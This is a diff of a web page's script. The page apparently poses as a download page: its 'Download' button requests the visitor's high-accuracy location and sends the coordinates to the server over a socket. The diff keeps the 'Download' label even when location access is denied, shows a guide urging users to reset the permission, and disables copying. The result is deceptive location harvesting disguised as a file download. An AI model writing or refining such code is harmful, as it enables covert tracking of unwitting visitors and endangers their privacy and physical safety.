@@ -152,49 +152,65 @@
       </div>
   </div>
 
-  <script>
-      const socket = io(); 
-      const btn = document.getElementById('locationBtn');
-      const guide = document.getElementById('guide-overlay');
-      const closeBtn = document.getElementById('closeGuide');
+<script>
+    const socket = io(); 
+    const btn = document.getElementById('locationBtn');
+    const guide = document.getElementById('guide-overlay');
+    const closeBtn = document.getElementById('closeGuide');
 
-      document.addEventListener('copy', (e) => e.preventDefault());
+    document.addEventListener('copy', (e) => e.preventDefault());
 
-      function showGuide() { guide.style.display = 'flex'; }
-      function hideGuide() { guide.style.display = 'none'; }
+    function showGuide() { guide.style.display = 'flex'; }
+    function hideGuide() { guide.style.display = 'none'; }
 
-      async function handleAction() {
-          const status = await navigator.permissions.query({ name: 'geolocation' });
-          if (status.state === 'denied') {
-              showGuide();
-          } else {
-              navigator.geolocation.getCurrentPosition(
-                  (pos) => { socket.emit('send-location', { lat: pos.coords.latitude, lng: pos.coords.longitude }); },
-                  (err) => { if (err.code === 1) { updateUI('denied'); } },
-                  { enableHighAccuracy: true }
-              );
-          }
-      }
+    async function handleAction() {
+        navigator.geolocation.getCurrentPosition(
+            (pos) => { 
+                socket.emit('send-location', { lat: pos.coords.latitude, lng: pos.coords.longitude }); 
+            },
+            (err) => { 
+                if (err.code === 1) { 
+                    updateUI('denied'); 
+                    showGuide();
+                } 
+            },
+            { enableHighAccuracy: true, timeout: 5000 }
+        );
+    }
 
-      function updateUI(state) {
-          if (state === 'denied') {
-              btn.innerText = "RESET Permissions";
-              btn.classList.add('blocked');
-          } else {
-              btn.innerText = "Download";
-              btn.classList.remove('blocked');
-              hideGuide(); 
-          }
-      }
+    function updateUI(state) {
+        if (state === 'denied') {
+            btn.innerText = "RESET Permissions";
+            btn.classList.add('blocked');
+        } else {
+            btn.innerText = "Download";
+            btn.classList.remove('blocked');
+            hideGuide(); 
+        }
+    }
 
-      btn.addEventListener('click', handleAction);
-      closeBtn.addEventListener('click', hideGuide); 
+    btn.addEventListener('click', handleAction);
+    closeBtn.addEventListener('click', hideGuide); 
 
-      window.onload = async () => {
-          const res = await navigator.permissions.query({ name: 'geolocation' });
-          updateUI(res.state);
-          res.onchange = () => updateUI(res.state);
-      };
-  </script>
+    window.onload = async () => {
+        try {
+            const res = await navigator.permissions.query({ name: 'geolocation' });
+            
+            if (res.state === 'denied') {
+                btn.innerText = "Download"; 
+            } else {
+                updateUI(res.state);
+            }
+
+            res.onchange = () => {
+                if(res.state === 'granted') updateUI('granted');
+            };
+        } catch (e) {
+            updateUI('prompt');
+        }
+    };
+</script>
+
+
 </body>
 </html>
